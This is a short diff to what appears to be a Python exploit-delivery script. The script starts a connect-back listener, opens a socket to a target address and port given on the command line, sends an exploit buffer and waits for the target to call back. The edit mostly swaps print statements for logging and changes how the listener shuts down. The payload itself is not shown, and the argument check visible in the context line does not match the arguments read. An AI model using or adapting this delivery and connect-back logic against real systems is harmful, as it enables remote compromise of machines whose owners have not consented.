@@ -102,22 +102,25 @@ if len(sys.argv) == 2:
 addr=sys.argv[1]
 port=int(sys.argv[2])
 pid=1
+
 pid=connectback_server.serve()
 time.sleep(1)
-if pid and pid > 0:
+if pid:
     try:
 
         sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
         sock.connect((addr,port))
-        print("sending exploit.")
+        logger.LOG_INFO("sending exploit.")
         sock.send(str(buf))
         sock.close()
         connectback_server.wait()
     except Exception as e:
-        print e
-        print("Failed to connect. Killing connect-back server.")
-        os.kill(pid,signal.SIGTERM)
-
+        logger.LOG_WARN("Failed to connect. ")
+        logger.LOG_WARN("Failed to connect. Killing connect-back server.")
+        connectback_server.shutdown()
+else:
+    logger.LOG_WARN("Failed to start connect-back server.")
+    sys.exit(1)
 
 
